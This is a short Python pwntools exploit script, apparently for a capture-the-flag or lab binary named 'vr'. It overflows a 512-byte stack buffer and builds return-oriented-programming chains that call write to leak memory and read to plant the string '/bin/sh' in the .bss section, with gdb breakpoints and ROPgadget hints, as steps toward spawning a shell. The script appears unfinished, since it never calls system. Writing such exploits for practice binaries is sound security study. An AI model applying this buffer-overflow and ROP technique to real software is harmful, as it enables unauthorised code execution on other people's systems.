from pwn import *

vul_func = 0x08048436
vr = ELF('vr')
write_plt = vr.symbols['write']
print "write_plt = " + hex(write_plt)
write_got = vr.got['write']
#p = process('./vr')

main_addr = 0x804847e
test_addr = 0x8048479
add_esp_8 = 0x0804851b
def leak(address):
    shellcode = 512 * 'A'
    shellcode += p32(write_plt) + p32(test_addr) + p32(1) + p32(address) + p32(4)
    #shellcode += p32(add_esp_8) + p32(0) + p32(write_plt) + p32(test_addr) + p32(1) + p32(address) + p32(4)
    #print shellcode
    p.send(shellcode)
    return p.recv(4)

print 'vul func:\t' + hex(vul_func)

#write "/bin/sh" to .bss section
#readelf -S vr
bss_addr = 0x0804a020
read_plt = vr.symbols['read']
print "read plt:\t " + hex(read_plt)

shellcode = 512 * 'A'
shellcode = cyclic(512)
#ROPgadget --binary vr --only "pop|ret"
pppr_addr = 0x08048519
print "pppr addr:\t " + hex(pppr_addr)
print "bss memory:\t " + hex(bss_addr)

'''================================='''
p = gdb.debug('./vr', '''
b vulnerable_code
b *vulnerable_code + 39
b *vulnerable_code + 56
display /5i $pc
display /10wx $esp
display /3s 0x0804a020
continue
''')
'''================================='''


#read(STDIN_FILENO, buffer_addr, buffer_size)
shellcode += p32(read_plt) + p32(vul_func) + p32(0) + p32(bss_addr) + p32(7)
p.send(shellcode)

input_string = '/bin/sh'
p.send(input_string)
p.wait_for_close()
